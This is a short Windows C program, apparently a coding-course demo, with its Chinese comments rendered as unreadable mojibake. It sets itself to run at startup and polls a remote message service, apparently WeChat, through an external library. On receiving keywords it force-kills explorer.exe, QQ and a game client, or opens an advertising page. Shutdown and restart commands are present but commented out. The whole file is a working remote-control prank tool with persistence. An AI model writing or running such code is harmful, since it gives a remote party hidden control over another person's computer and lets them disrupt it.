#include <stdio.h>
#include <windows.h>  //Sleep����������������
#include "itmojun.h"  //������ǰ����Ŀ¼�µ�itmojun.hͷ�ļ�

//���뵱ǰ����Ŀ¼�µ�itmojun.lib������ļ�����Ϊ����Ҫ�����������һЩ����
#pragma comment(lib, "itmojun.lib")


int main()
{
	char cmd[301];  //��Ŵ�΢�Ŷ˽��յ���Ϣ

	AutoRun();  //����ǰ��������Ϊ�����Զ�����

	while(1)
	{
		//GetPCCmd�����Ĺ��ܣ���΢�Ŷ˽���һ����Ϣ�����û���κ���Ϣ������һֱ�ȴ�
		//��һ������Ϊ����ID����ͬ���Խ���ʹ�ò�ͬ��ID
		//�ڶ�������Ϊ������Ϣ������
		GetPCCmd("dj", cmd);

		printf("%s\n", cmd);

		//strstr�����Ĺ��ܣ���һ���ַ����в������ַ���������ҵ��򷵻���ָ�룬���򷵻�NULL
		if(strstr(cmd, "�ػ�"))
		{
			//�ػ�
			//WinExec("shutdown -s -t 0", 0);
		}
		else if(strstr(cmd, "����"))
		{
			//����
			//WinExec("shutdown -r -t 0", 0);
		}
		else if(strstr(cmd, "����"))
		{
			static int kill_flag = 1;

			if(kill_flag)
				//�ɵ�����
				WinExec("taskkill /f /im explorer.exe", 0);
			else
				//�ָ�����
				WinExec("C:\\Windows\\explorer.exe", 1);

			kill_flag = !kill_flag;
		}
		else if(strstr(cmd, "ɱ���"))
		{
			//ǿ�ƽ���QQ
			WinExec("taskkill /f /im qq.exe", 0);
		}		
		else if(strstr(cmd, "����"))
		{
			//ǿ�ƽ���Ӣ������
			WinExec("taskkill /f /im client.exe", 0);
		}		
		else if(strstr(cmd, "���"))
		{
			//ǿ�ƴ򿪹��ҳ��
			WinExec("explorer https://itmojun.com", 1);
		}	
		else if(strstr(cmd, "���±�"))
		{
			//�򿪼��±�
			WinExec("notepad", 1);
		}


		Sleep(3000);  //��ʱ3�룬������յ��ظ�����Ϣ����Ϊ��Ϣ���ڷ��������ݴ�3��
	}

	return 0;
}